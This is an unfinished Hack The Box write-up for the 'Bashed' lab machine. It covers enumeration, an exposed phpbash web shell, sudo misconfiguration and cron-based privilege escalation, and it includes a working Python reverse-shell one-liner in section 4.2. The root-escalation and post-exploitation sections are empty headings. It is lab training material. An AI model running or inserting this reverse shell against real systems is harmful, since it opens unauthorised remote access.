# 1.0 - HACK THE BOX: BASHED

![image](https://github.com/Gladoodles/hackthebox_machines/assets/96867367/026729e2-83a0-443d-a421-c2c83d2bd744)

**Vulnerability Explanation**: The web server has unintentionally exposed a php script in the /dev/ web directory that allows an unauthenticated user to remotely execute bash commands. Furthermore, the www-data user can run commands as the 'scriptmanager' user without needing a password which created a path for privilege escalation to that user and then to the 'root' user via a misconfigured cron job. 

**Vulnerability Fix**: Restrict access to the /dev/ web directory and remove the phpbash.php script. Additionally, require a password when performing sudo commands as the www-data user. 

**Severity**: Critical.

**Steps to reproduce the attack**: Enumeration was undertaken using NMAP which discovered the web server running on port 80. Web directories were then scanned using dirbuster which exposed the /dev/ directory and the .php scripts; navigating to this on a browser results in a web shell. Privilege escalation was then performed by taking advantage of the NOPASSWD value set for sudo commands on the www-data user by moving to the scriptmanager user shell. Escalation to the root user was then performed by editing a script to copy the /bin/bash binary to a new location with the setuid bit set.

## 2.0 - ENUMERATION
| **IP ADDRESS** | **OPEN PORTS** |
|----------|--------------------|
| 10.10.10.68 | TCP: 80 |

#### **2.1 - NMAP**

Port 80 was discovered using NMAP:

![image](https://github.com/Gladoodles/hackthebox_machines/assets/96867367/7fce3128-5737-4b70-814e-04687c2fcc44)

#### **2.2 - nikto**

A vulnerability scan was performed using nikto which flagged a number of interesting directories including other issues which were not explored during this test. 

![image](https://github.com/Gladoodles/hackthebox_machines/assets/96867367/d5e3d5a4-9258-4e91-89f0-da1272b204e1)

#### **2.3 - dirbuster** 

With the nikto scan in mind a dirbuster scan was performed to brute-force web directories which exposed the phpbash.php web shell script. 

![image](https://github.com/Gladoodles/hackthebox_machines/assets/96867367/b6691ce0-57ad-46d1-8118-36b82e586362)
![image](https://github.com/Gladoodles/hackthebox_machines/assets/96867367/2401dd5f-e8b1-40fc-a17d-83af0ef68d10)


## 3.0 - EXPLOITATION

#### **3.1 - Accessing the Web Shell**

Exploitation was simple, by navigating to the /dev/phpbash.php web directory we could get web shell as the www-data user. From here we have full access to the web server. 

![image](https://github.com/Gladoodles/hackthebox_machines/assets/96867367/d0abe153-d486-49d6-87a5-b2e604702ba5)

## 4.0 - PRIVILEGE ESCALATION 

#### **4.1 - sudo -l**

As the www-data user when performing the sudo -l command we can see that commands can be run as the 'scriptmanager' user without the need for a password. 

![image](https://github.com/Gladoodles/hackthebox_machines/assets/96867367/9564681b-0d11-40ce-8122-5749605bd2a1)
![image](https://github.com/Gladoodles/hackthebox_machines/assets/96867367/34411839-1474-4a87-ab6e-11a972f1b889)

#### **4.2 - reverse shell**

Because we can run commands as scriptmanagr a reverse shell was created using python which allowed our first privilege escalation to the scriptmanager user itself. 

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.0",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
Catching the reverse shell and checking the user id we can see it was sucsessful:

![image](https://github.com/Gladoodles/hackthebox_machines/assets/96867367/6ee34a27-8da2-4132-ba2b-9d16912b551c)

#### 4.3 - escalation to root**

## 5.0 - POST-EXPLOITATION 
